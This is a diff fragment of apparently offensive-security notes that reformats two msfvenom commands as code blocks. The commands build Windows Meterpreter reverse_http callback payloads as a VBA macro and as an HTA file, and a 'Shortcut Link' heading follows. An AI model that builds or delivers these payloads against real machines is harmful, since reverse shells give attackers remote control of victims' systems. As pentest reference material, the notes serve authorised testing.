@@ -8,11 +8,15 @@ Refer to the [[Payload Delivery|payload delivery scripts]] helpers section.
 
 #### 1.1.1 - VBA Macro
 
-`$ msfvenom -p windows/x64/meterpreter/reverse_http lhost=<IP> lport=80 -f vba-psh -o macro.vbs`
+```
+$ msfvenom -p windows/x64/meterpreter/reverse_http lhost=<IP> lport=80 -f vba-psh -o macro.vbs
+```
 
 #### 1.1.2 - HTA Callback Shell
 
-`$ msfvenom -p windows/x64/meterpreter/reverse_http lhost=<IP> lport=80 -f hta-psh -o hta-payload.hta`
+```
+$ msfvenom -p windows/x64/meterpreter/reverse_http lhost=<IP> lport=80 -f hta-psh -o hta-payload.hta
+```
 
 #### 1.1.3 - Shortcut Link
 
